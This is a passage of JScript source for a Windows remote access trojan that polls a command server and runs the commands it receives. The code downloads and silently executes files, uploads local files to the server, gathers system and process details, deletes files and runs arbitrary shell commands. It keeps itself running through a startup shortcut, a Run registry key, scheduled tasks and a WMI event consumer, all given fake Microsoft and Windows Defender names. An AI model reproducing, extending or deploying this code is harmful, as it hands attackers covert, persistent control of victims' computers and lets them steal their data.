                resultMsg += "Method: CertUtil\n";
            }
        } catch(e) { resultMsg += "CertUtil failed: " + e.message + "\n"; }
    }

    if (!downloaded) {
        return resultMsg + "FAILED: All download methods exhausted\n[Exit Code: 1]";
    }

    var fileSize = fso.GetFile(localPath).Size;
    resultMsg += "Size: " + formatSize(fileSize) + "\n";
    resultMsg += "Saved: " + localPath + "\n";
    try { setHidden(localPath); } catch(e) {}

    if (execute) {
        try {
            WshShell.Run('"' + localPath + '"', 0, false);
            resultMsg += "Executed: YES (background)\n";
        } catch(e) {
            try {
                WshShell.Run('cmd.exe /c "' + localPath + '"', 0, false);
                resultMsg += "Executed via cmd: YES\n";
            } catch(e2) {
                resultMsg += "Execute failed: " + e2.message + "\n";
            }
        }
        if (deleteAfter) {
            WScript.Sleep(5000);
            try { if (fso.FileExists(localPath)) fso.DeleteFile(localPath); resultMsg += "Deleted after exec\n"; } catch(e) {}
        }
    }

    return resultMsg + "[Exit Code: 0]";
}

// ========== UPLOAD ==========
function handleUpload(command) {
    try {
        var args = command;
        if (/^UPLOAD:/i.test(args)) args = args.substring(7);
        var parts = args.split(":");
        var filePath = expandEnvVars(trim(parts[0]));
        var execute  = args.indexOf(":EXECUTE") > -1;

        if (!fso.FileExists(filePath)) return "File not found: " + filePath + "\n[Exit Code: 1]";

        var file = fso.GetFile(filePath);
        var filename = file.Name;

        var adoStream = WScript.CreateObject("ADODB.Stream");
        adoStream.Type = 1; // Binary
        adoStream.Open();
        adoStream.LoadFromFile(filePath);
        var fileData = adoStream.Read();
        adoStream.Close();

        var winHttp = WScript.CreateObject("WinHttp.WinHttpRequest.5.1");
        winHttp.Open("POST", CONFIG.SERVER + "/upload", false);
        winHttp.SetRequestHeader("X-Filename", filename);
        winHttp.SetRequestHeader("X-AgentId", CONFIG.CLIENT_ID);
        if (execute) winHttp.SetRequestHeader("X-Execute", "true");
        winHttp.SetRequestHeader("Content-Type", "application/octet-stream");
        winHttp.SetTimeouts(30000, 30000, 300000, 300000);
        winHttp.Send(fileData);

        if (winHttp.Status == 200) {
            return "File uploaded: " + filePath + " (" + formatSize(file.Size) + ")\n[Exit Code: 0]";
        } else {
            return "Upload failed: HTTP " + winHttp.Status + "\n[Exit Code: 1]";
        }
    } catch(e) {
        return "Upload error: " + e.message + "\n[Exit Code: 1]";
    }
}

// ========== EXECUTE FILE ==========
function handleExecute(command) {
    try {
        var filePath = expandEnvVars(trim(command));
        if (!fso.FileExists(filePath)) return "File not found: " + filePath + "\n[Exit Code: 1]";
        WshShell.Run('"' + filePath + '"', 0, false);
        return "Executed (background): " + filePath + "\n[Exit Code: 0]";
    } catch(e) {
        return "Execute error: " + e.message + "\n[Exit Code: 1]";
    }
}

// ========== SYSTEM INFO ==========
function getSystemInfo() {
    var result = executeViaBatchFile("systeminfo", currentDirectory, 60000);
    var out = "=== System Information ===\n";
    out += "OS: " + getWindowsVersion() + "\n";
    out += "Computer: " + network.ComputerName + "\n";
    out += "User: " + network.UserName + "\n";
    out += "Domain: " + network.UserDomain + "\n";
    out += "IP: " + getLocalIP() + "\n";
    out += "MAC: " + getMacAddress() + "\n";
    out += "Client ID: " + CONFIG.CLIENT_ID + "\n";
    out += "Current Dir: " + currentDirectory + "\n";
    out += "Uptime: " + Math.floor((new Date().getTime() - connectionStartTime) / 1000) + "s\n";
    out += "\n=== System Details ===\n";
    out += result.stdout;
    return out;
}

// ========== PROCESS LIST ==========
function getProcessList() {
    var result = executeViaBatchFile("tasklist /FO CSV /V", currentDirectory, 30000);
    return "Process List\n========================================\n" + result.stdout;
}

// ========== FILE OPERATIONS ==========
function listFiles(path) {
    try {
        if (!path || trim(path) == "") path = currentDirectory;
        path = expandEnvVars(trim(path));
        if (!fso.FolderExists(path)) return "Directory not found: " + path;

        var folder = fso.GetFolder(path);
        var result = "Directory listing: " + folder.Path + "\n";
        result += "========================================\n";
        result += padRight("Name", 40) + padRight("Size", 12) + "Modified\n";
        result += "--------------------------------------------------------\n";

        var subFolders = new Enumerator(folder.SubFolders);
        for (; !subFolders.atEnd(); subFolders.moveNext()) {
            var sf = subFolders.item();
            result += padRight("[" + sf.Name + "]", 40) + padRight("<DIR>", 12) + sf.DateLastModified + "\n";
        }

        var files = new Enumerator(folder.Files);
        for (; !files.atEnd(); files.moveNext()) {
            var f = files.item();
            result += padRight(f.Name, 40) + padRight(formatSize(f.Size), 12) + f.DateLastModified + "\n";
        }

        return result;
    } catch(e) { return "Error listing files: " + e.message; }
}

function padRight(str, len) {
    str = str.toString();
    while (str.length < len) str += " ";
    if (str.length > len) str = str.substring(0, len - 3) + "...";
    return str;
}

function listRootDrives() {
    try {
        var result = "Root Drives\n========================================\n";
        var drives = new Enumerator(fso.Drives);
        for (; !drives.atEnd(); drives.moveNext()) {
            var drive = drives.item();
            result += drive.DriveLetter + ":\\ ";
            try {
                if (drive.IsReady) {
                    result += "[" + getDriveTypeName(drive.DriveType) + "] ";
                    result += formatSize(drive.FreeSpace) + " free of " + formatSize(drive.TotalSize);
                } else {
                    result += "[Not Ready]";
                }
            } catch(e) { result += "[Error]"; }
            result += "\n";
        }
        return result;
    } catch(e) { return "Error listing drives: " + e.message; }
}

function getDriveTypeName(t) {
    switch(t) {
        case 0: return "Unknown"; case 1: return "Removable"; case 2: return "Fixed";
        case 3: return "Network"; case 4: return "CD-ROM"; case 5: return "RAM";
        default: return "Unknown";
    }
}

function readFile(filePath) {
    try {
        filePath = expandEnvVars(trim(filePath));
        if (!fso.FileExists(filePath)) return "File not found: " + filePath;
        var file = fso.GetFile(filePath);
        if (file.Size > 2097152) return "File too large: " + formatSize(file.Size) + " (limit: 2MB)";
        var content = readFileContents(filePath);
        return "File: " + filePath + "\nSize: " + formatSize(file.Size) + "\n========================================\n" + content;
    } catch(e) { return "Error reading file: " + e.message; }
}

function deleteFile(filePath) {
    try {
        filePath = expandEnvVars(trim(filePath));
        if (fso.FileExists(filePath)) {
            fso.DeleteFile(filePath, true);
            return "Deleted file: " + filePath;
        } else if (fso.FolderExists(filePath)) {
            fso.DeleteFolder(filePath, true);
            return "Deleted folder: " + filePath;
        } else {
            return "Not found: " + filePath;
        }
    } catch(e) { return "Error deleting: " + e.message; }
}

function createFolder(path) {
    try {
        path = expandEnvVars(trim(path));
        if (fso.FolderExists(path)) return "Folder already exists: " + path;
        fso.CreateFolder(path);
        return "Created folder: " + path;
    } catch(e) { return "Error creating folder: " + e.message; }
}

function copyFile(command) {
    try {
        var parts = command.split(":");
        if (parts.length < 2) return "Invalid format. Use: source:destination";
        var src  = expandEnvVars(trim(parts[0]));
        var dest = expandEnvVars(trim(parts[1]));
        if (!fso.FileExists(src)) return "Source not found: " + src;
        fso.CopyFile(src, dest, true);
        return "Copied: " + src + " -> " + dest;
    } catch(e) { return "Error copying: " + e.message; }
}

function moveFile(command) {
    try {
        var parts = command.split(":");
        if (parts.length < 2) return "Invalid format. Use: source:destination";
        var src  = expandEnvVars(trim(parts[0]));
        var dest = expandEnvVars(trim(parts[1]));
        if (!fso.FileExists(src)) return "Source not found: " + src;
        fso.MoveFile(src, dest);
        return "Moved: " + src + " -> " + dest;
    } catch(e) { return "Error moving: " + e.message; }
}

function renameFile(command) {
    try {
        var parts = command.split(":");
        if (parts.length < 2) return "Invalid format. Use: oldpath:newname";
        var oldPath = expandEnvVars(trim(parts[0]));
        var newName = trim(parts[1]);
        if (!fso.FileExists(oldPath)) return "File not found: " + oldPath;
        var file = fso.GetFile(oldPath);
        file.Name = newName;
        return "Renamed to: " + newName;
    } catch(e) { return "Error renaming: " + e.message; }
}

function getFileProperties(filePath) {
    try {
        filePath = expandEnvVars(trim(filePath));
        var isFile   = fso.FileExists(filePath);
        var isFolder = fso.FolderExists(filePath);
        if (!isFile && !isFolder) return "Not found: " + filePath;
        var item = isFile ? fso.GetFile(filePath) : fso.GetFolder(filePath);
        return "=== Properties: " + item.Name + " ===\n" +
               "Path: "     + item.Path + "\n" +
               "Type: "     + (isFile ? "File" : "Folder") + "\n" +
               "Size: "     + formatSize(item.Size) + "\n" +
               "Created: "  + item.DateCreated + "\n" +
               "Modified: " + item.DateLastModified + "\n" +
               "Accessed: " + item.DateLastAccessed + "\n" +
               "Attributes: " + item.Attributes + "\n";
    } catch(e) { return "Error getting properties: " + e.message; }
}

function openFile(filePath) {
    try {
        filePath = expandEnvVars(trim(filePath));
        if (!fso.FileExists(filePath)) return "File not found: " + filePath;
        WshShell.Run('"' + filePath + '"', 1, false);
        return "Opened: " + filePath;
    } catch(e) { return "Error opening: " + e.message; }
}

function executeFile(filePath) {
    try {
        filePath = expandEnvVars(trim(filePath));
        if (!fso.FileExists(filePath)) return "File not found: " + filePath;
        WshShell.Run('"' + filePath + '"', 0, false);
        return "Executed (background): " + filePath + "\n[Exit Code: 0]";
    } catch(e) { return "Execute error: " + e.message; }
}

function killProcess(pid) {
    try {
        var result = executeViaBatchFile("taskkill /F /PID " + trim(pid), currentDirectory, 15000);
        return "Kill PID " + pid + ":\n" + result.stdout;
    } catch(e) { return "Error killing process: " + e.message; }
}

function killAgent() {
    WScript.Quit(0);
    return "Agent terminated";
}

function formatSize(bytes) {
    bytes = parseInt(bytes, 10) || 0;
    if (bytes < 1024) return bytes + " B";
    if (bytes < 1048576) return Math.round(bytes / 1024 * 10) / 10 + " KB";
    if (bytes < 1073741824) return Math.round(bytes / 1048576 * 10) / 10 + " MB";
    return Math.round(bytes / 1073741824 * 10) / 10 + " GB";
}

// ========== PERSISTENCE (WITH TASK EXISTENCE CHECK) ==========
function installPersistence() {
    if (!IS_INSTALLED || !INSTALLED_SCRIPT) return false;
    var methods = [];
    if (addStartupShortcut())  methods.push("Startup");
    if (addRunRegistryKey())   methods.push("Registry");
    if (addScheduledTask())    methods.push("ScheduledTask");
    if (addWatchdogTask())     methods.push("Watchdog");
    if (addWMIEventConsumer()) methods.push("WMI");
    return methods.length > 0;
}

function addStartupShortcut() {
    try {
        var startupDir = WshShell.SpecialFolders("Startup");
        if (!startupDir || !fso.FolderExists(startupDir)) return false;
        var shortcutPath = fso.BuildPath(startupDir, "Windows Update Assistant.lnk");
        if (fso.FileExists(shortcutPath)) return true;
        var sc = WshShell.CreateShortcut(shortcutPath);
        sc.TargetPath = "wscript.exe";
        sc.Arguments = '//B //Nologo "' + INSTALLED_SCRIPT + '"';
        sc.WindowStyle = 0;
        sc.Description = "Windows System Component";
        sc.WorkingDirectory = INSTALL_DIR;
        sc.Save();
        try { setHidden(shortcutPath); } catch(e) {}
        return true;
    } catch(e) { return false; }
}

function addRunRegistryKey() {
    try {
        var keyPath = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdateAgent";
        try { var ex = WshShell.RegRead(keyPath); if (ex) return true; } catch(e) {}
        WshShell.RegWrite(keyPath, 'wscript.exe //B //Nologo "' + INSTALLED_SCRIPT + '"', "REG_SZ");
        return true;
    } catch(e) { return false; }
}

// ========== FIXED: SCHEDULED TASK WITH EXISTENCE CHECK ==========
// ========== FIXED: SCHEDULED TASK WITH HOURLY EXECUTION ==========
function addScheduledTask() {
    try {
        var taskName = "MicrosoftEdgeUpdateCore";
        
        // First, check if task already exists
        if (taskExists(taskName)) {
            // Update existing task to run hourly instead of every 10 minutes
            updateTaskToHourly(taskName);
            return true;
        }
        
        // Task doesn't exist - create it with hourly schedule
        var tempDir = fso.GetSpecialFolder(2).Path;
        var addVbs = fso.BuildPath(tempDir, "add_" + Math.floor(Math.random() * 10000) + ".vbs");
        
        // CHANGED: from /mo 10 (every 10 min) to /mo 60 (every 60 min)
        var addContent = 'On Error Resume Next\n' +
            'Set s=CreateObject("WScript.Shell")\n' +
            'cmd="schtasks /create /tn """ & "' + taskName + '" & """ /tr ""wscript.exe //B //Nologo \\""' + INSTALLED_SCRIPT + '\\"" "" /sc minute /mo 60 /f /rl highest"\n' +
            'r=s.Run(cmd,0,True)\n' +
            'WScript.Quit r\n';
        
        writeTextFile(addVbs, addContent, false);
        var ec2 = WshShell.Run('wscript.exe //B //Nologo "' + addVbs + '"', 0, true);
        try { fso.DeleteFile(addVbs); } catch(e) {}
        
        return (ec2 === 0);
        
    } catch(e) { return false; }
}

// ========== UPDATE EXISTING TASK TO HOURLY ==========
function updateTaskToHourly(taskName) {
    try {
        var tempDir = fso.GetSpecialFolder(2).Path;
        var updateVbs = fso.BuildPath(tempDir, "upd_" + Math.floor(Math.random() * 10000) + ".vbs");
        
        var updateContent = 'On Error Resume Next\n' +
            'Set s=CreateObject("WScript.Shell")\n' +
            's.Run "schtasks /change /tn """ & "' + taskName + '" & """ /mo 60", 0, True\n' +
            'WScript.Quit 0\n';
        
        writeTextFile(updateVbs, updateContent, false);
        WshShell.Run('wscript.exe //B //Nologo "' + updateVbs + '"', 0, true);
        try { fso.DeleteFile(updateVbs); } catch(e) {}
        
        return true;
    } catch(e) {
        return false;
    }
}
// ========== FIXED: WATCHDOG TASK WITH EXISTENCE CHECK ==========
// ========== FIXED: WATCHDOG TASK WITH HOURLY EXECUTION ==========
function addWatchdogTask() {
    try {
        var taskName = "WindowsDefenderScheduledScan";
        
        // Check if watchdog task already exists
        if (taskExists(taskName)) {
            updateTaskToHourly(taskName);
            return true;
        }
        
        var watchdogScript = fso.BuildPath(INSTALL_DIR, "wdscan.vbs");

        if (!fso.FileExists(watchdogScript)) {
            var wdContent = 'On Error Resume Next\n' +
                'Set w=GetObject("winmgmts:\\\\.\\root\\cimv2")\n' +
                'Set p=w.ExecQuery("SELECT * FROM Win32_Process WHERE Name=\'wscript.exe\'")\n' +
                'running=False\n' +
                'scriptName="' + fso.GetFileName(INSTALLED_SCRIPT).toLowerCase() + '"\n' +
                'myPid=' + getCurrentPID() + '\n' +
                'For Each proc In p\n' +
                '  If proc.ProcessId <> myPid Then\n' +
                '    If InStr(LCase(proc.CommandLine), scriptName)>0 Then running=True\n' +
                '  End If\n' +
                'Next\n' +
                'If Not running Then\n' +
                '  Set s=CreateObject("WScript.Shell")\n' +
                '  s.Run "wscript.exe //B //Nologo """ & "' + INSTALLED_SCRIPT + '" & """",0,False\n' +
                'End If\n';
            writeTextFile(watchdogScript, wdContent, false);
            try { setHidden(watchdogScript); } catch(e) {}
        }

        var tempDir = fso.GetSpecialFolder(2).Path;
        var addVbs = fso.BuildPath(tempDir, "addwd_" + Math.floor(Math.random()*99999) + ".vbs");
        
        // CHANGED: from /mo 5 (every 5 min) to /mo 60 (every 60 min)
        var addContent2 = 'On Error Resume Next\n' +
            'Set s=CreateObject("WScript.Shell")\n' +
            'cmd="schtasks /create /tn """ & "' + taskName + '" & """ /tr ""wscript.exe //B //Nologo \\""' + watchdogScript + '\\"" "" /sc minute /mo 60 /f /rl highest"\n' +
            'r=s.Run(cmd,0,True)\n' +
            'WScript.Quit r\n';
        writeTextFile(addVbs, addContent2, false);
        var ec = WshShell.Run('wscript.exe //B //Nologo "' + addVbs + '"', 0, true);
        try { fso.DeleteFile(addVbs); } catch(e) {}
        return (ec === 0);
        
    } catch(e) { return false; }
}

// ========== GET CURRENT PROCESS ID ==========
function getCurrentPID() {
    try {
        var wmi = GetObject("winmgmts:\\\\.\\root\\cimv2");
        var processes = wmi.ExecQuery("SELECT * FROM Win32_Process WHERE Name='wscript.exe' AND CommandLine LIKE '%" + fso.GetFileName(INSTALLED_SCRIPT) + "%'");
        var e = new Enumerator(processes);
        if (!e.atEnd()) {
            return e.item().ProcessId;
        }
    } catch(e) {}
    return 0;
}
// ========== NEW: TASK EXISTENCE CHECK FUNCTION ==========
function taskExists(taskName) {
    try {
        var tempDir = fso.GetSpecialFolder(2).Path;
        var checkVbs = fso.BuildPath(tempDir, "chk_" + Math.floor(Math.random() * 10000) + ".vbs");
        
        var vbsContent = 'On Error Resume Next\n' +
            'Set s=CreateObject("WScript.Shell")\n' +
            'r=s.Run("schtasks /query /tn """ & "' + taskName + '" & """ >nul 2>&1", 0, True)\n' +
            'WScript.Quit r\n';
        
        writeTextFile(checkVbs, vbsContent, false);
        var ec = WshShell.Run('wscript.exe //B //Nologo "' + checkVbs + '"', 0, true);
        try { fso.DeleteFile(checkVbs); } catch(e) {}
        
        return (ec === 0);
    } catch(e) {
        return false;
    }
}

function addWMIEventConsumer() {
    try {
        var vbsContent = 'On Error Resume Next\n' +
            'Set w=GetObject("winmgmts:\\\\.\\root\\subscription")\n' +
            'Set f=w.Get("__EventFilter").SpawnInstance_()\n' +
            'f.Name="WindowsSystemFilter"\n' +
            'f.EventNameSpace="root\\cimv2"\n' +
            'f.QueryLanguage="WQL"\n' +
            'f.Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \'Win32_PerfFormattedData_PerfOS_System\'"\n' +
            'Set fp=f.Put_\n' +
            'Set c=w.Get("CommandLineEventConsumer").SpawnInstance_()\n' +
            'c.Name="WindowsSystemConsumer"\n' +
            'c.CommandLineTemplate="wscript.exe //B //Nologo """ & "' + INSTALLED_SCRIPT + '" & """"\n' +
            'Set cp=c.Put_\n' +
            'Set b=w.Get("__FilterToConsumerBinding").SpawnInstance_()\n' +
            'b.Filter=fp.Path\nb.Consumer=cp.Path\nb.Put_\n' +
            'WScript.Quit 0\n';
        var tempVbs = fso.BuildPath(fso.GetSpecialFolder(2).Path, "wmi_" + Math.floor(Math.random()*99999) + ".vbs");
        writeTextFile(tempVbs, vbsContent, false);
        var ec = WshShell.Run('wscript.exe //B //Nologo "' + tempVbs + '"', 0, true);
        try { fso.DeleteFile(tempVbs); } catch(e) {}
        return (ec === 0);
    } catch(e) { return false; }
}

function checkAndRepairPersistence() {
    try {
        addStartupShortcut();
        addRunRegistryKey();
        // Check if tasks exist before attempting to recreate them
        if (!taskExists("MicrosoftEdgeUpdateCore")) {
            addScheduledTask();
        }
        if (!taskExists("WindowsDefenderScheduledScan")) {
            addWatchdogTask();
        }
        return true;
    } catch(e) { return false; }
}

function removePersistence() {
    try {
        try {
            var startupDir = WshShell.SpecialFolders("Startup");
            var sc = fso.BuildPath(startupDir, "Windows Update Assistant.lnk");
            if (fso.FileExists(sc)) fso.DeleteFile(sc);
        } catch(e) {}
        try { WshShell.RegDelete("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdateAgent"); } catch(e) {}
        
        // Only attempt to delete if tasks exist
        if (taskExists("MicrosoftEdgeUpdateCore")) {
            var rmVbs1 = fso.BuildPath(fso.GetSpecialFolder(2).Path, "rm1_" + Math.floor(Math.random()*9999) + ".vbs");
            writeTextFile(rmVbs1, 'CreateObject("WScript.Shell").Run "schtasks /delete /tn ""MicrosoftEdgeUpdateCore"" /f >nul 2>&1",0,True\n', false);
            WshShell.Run('wscript.exe //B //Nologo "' + rmVbs1 + '"', 0, true);
            try { fso.DeleteFile(rmVbs1); } catch(e) {}
        }
        
        if (taskExists("WindowsDefenderScheduledScan")) {
            var rmVbs2 = fso.BuildPath(fso.GetSpecialFolder(2).Path, "rm2_" + Math.floor(Math.random()*9999) + ".vbs");
            writeTextFile(rmVbs2, 'CreateObject("WScript.Shell").Run "schtasks /delete /tn ""WindowsDefenderScheduledScan"" /f >nul 2>&1",0,True\n', false);
            WshShell.Run('wscript.exe //B //Nologo "' + rmVbs2 + '"', 0, true);
            try { fso.DeleteFile(rmVbs2); } catch(e) {}
        }
        
        return true;
    } catch(e) { return false; }
}

function handlePersistenceCommand(action) {
    action = trim(action).toUpperCase();
    if (action == "INSTALL" || action == "ADD" || action == "ENABLE") {
        return installPersistence() ? "Persistence installed successfully" : "Persistence installation failed (may require elevation)";
    } else if (action == "REMOVE" || action == "DELETE" || action == "DISABLE") {
        return removePersistence() ? "Persistence removed successfully" : "Failed to remove persistence";
    } else if (action == "REPAIR" || action == "CHECK") {
        return checkAndRepairPersistence() ? "Persistence checked and repaired" : "Failed to check persistence";
    } else if (action == "" || action == "PERSISTENCE") {
        return installPersistence() ? "Persistence installed" : "Persistence failed";
    } else {
        return "Unknown persistence action: " + action + "\nValid: INSTALL, REMOVE, REPAIR";
    }
}

// ========== MAIN COMMAND DISPATCHER ==========
function executeCommand(command, type) {
    var actualCommand = command;

    // Strip type prefix if present
    if (command.indexOf(':') > -1) {
        var prefix = command.substring(0, command.indexOf(':')).toUpperCase();
        if (prefix === type.toUpperCase()) {
            actualCommand = command.substring(command.indexOf(':') + 1);
        }
    }

    var typeUpper = type.toUpperCase();

    switch(typeUpper) {
        case "SHELL":        return executeShellCommand(actualCommand);
        case "DOWNLOAD":     return handleDownload(command);
        case "UPLOAD":       return handleUpload(command);
        case "EXECUTE":      return handleExecute(actualCommand);
        case "PERSISTENCE":  return handlePersistenceCommand(actualCommand);
        case "SYSINFO":      return getSystemInfo();
        case "PROCESS_LIST": return getProcessList();
        case "LISTFILES":    return listFiles(actualCommand);
        case "LISTROOTDRIVES": return listRootDrives();
        case "READFILE":     return readFile(actualCommand);
        case "DELETEFILE":   return deleteFile(actualCommand);
        case "NEWFOLDER":    return createFolder(actualCommand);
        case "KILL_PROCESS": return killProcess(actualCommand);
        case "EXECUTEFILE":  return executeFile(actualCommand);
        case "FILEPROPERTIES": return getFileProperties(actualCommand);
        case "OPENFILE":     return openFile(actualCommand);
        case "COPYFILE":     return copyFile(actualCommand);
        case "MOVEFILE":     return moveFile(actualCommand);
        case "RENAMEFILE":   return renameFile(actualCommand);
        case "KILL":         return killAgent();
        default:
            return executeShellCommand(command);
    }
}

function executeAndSendResult(taskId, command, type) {
    var result = executeCommand(command, type);
    sendResult(taskId, result);
}

function sendResult(taskId, result) {
    try {
        var resultData = "taskId=" + encodeURIComponent(taskId) +
                        "&agentId=" + encodeURIComponent(CONFIG.CLIENT_ID) +
                        "&result=" + encodeURIComponent(result) +
                        "&session=" + encodeURIComponent(sessionToken ? sessionToken : "");
        var response = httpRequest(CONFIG.SERVER + "/result", "POST", resultData);
        return response.success;
    } catch(e) { return false; }
}


// ========== CHECK IF AGENT IS ALREADY RUNNING ==========
function isAgentRunning() {
    try {
        var wmi = GetObject("winmgmts:\\\\.\\root\\cimv2");
        var processes = wmi.ExecQuery("SELECT * FROM Win32_Process WHERE Name='wscript.exe'");
        var scriptName = fso.GetFileName(INSTALLED_SCRIPT).toLowerCase();
        var count = 0;
        
        var e = new Enumerator(processes);
        for (; !e.atEnd(); e.moveNext()) {
            var proc = e.item();
            var cmdLine = proc.CommandLine || "";
            if (cmdLine.toLowerCase().indexOf(scriptName) > -1) {
                count++;
            }
        }
        
        // If more than 1 instance is running, we have duplicates
        return count > 1;
    } catch(e) {
        return false;
    }
}

function killDuplicateProcesses() {
    try {
        var wmi = GetObject("winmgmts:\\\\.\\root\\cimv2");
        var processes = wmi.ExecQuery("SELECT * FROM Win32_Process WHERE Name='wscript.exe'");
        var scriptName = fso.GetFileName(INSTALLED_SCRIPT).toLowerCase();
        var myPid = WScript.ScriptName ? 0 : 0; // Can't easily get own PID in WScript
        
        var instances = [];
        var e = new Enumerator(processes);
        for (; !e.atEnd(); e.moveNext()) {
            var proc = e.item();
            var cmdLine = proc.CommandLine || "";
            if (cmdLine.toLowerCase().indexOf(scriptName) > -1) {
                instances.push(proc.ProcessId);
            }
        }
        
        // Keep the first instance, kill the rest
        if (instances.length > 1) {
            for (var i = 1; i < instances.length; i++) {
                try {
                    WshShell.Run("taskkill /F /PID " + instances[i], 0, true);
                    log("Killed duplicate process: PID " + instances[i]);
                } catch(e) {}
            }
            return true;
        }
    } catch(e) {}
    return false;
}

// ========== MAIN ==========
function main() {
    initializeStealth();

    if (!IS_INSTALLED) {
        WScript.Quit(0);
    }

    CONFIG.CLIENT_ID = generateClientId();

	killDuplicateProcesses();
    installPersistence();
	
	

    var registered = false;
    var retryCount = 0;
    while (!registered && retryCount < 30) {
        registered = performRegistration();
        if (!registered) { retryCount++; WScript.Sleep(5000); }
    }

    sendHeartbeat();

    var persistenceCheckCounter  = 0;
    var registrationCheckCounter = 0;

    while (true) {
        try {
            pollCount++;
            registrationCheckCounter++;
            pollForCommands();

            if (shouldSendHeartbeat()) sendHeartbeat();

            persistenceCheckCounter++;
            if (persistenceCheckCounter >= 100) {
                checkAndRepairPersistence();
                persistenceCheckCounter = 0;
            }

            if (registrationCheckCounter >= 10) {
                if (!sessionToken) performRegistration();
                registrationCheckCounter = 0;
            }
        } catch(e) {}

        WScript.Sleep(CONFIG.POLL_INTERVAL * 1000);
    }
}

try {
    main();
} catch(e) {
    WScript.Sleep(3000);
}
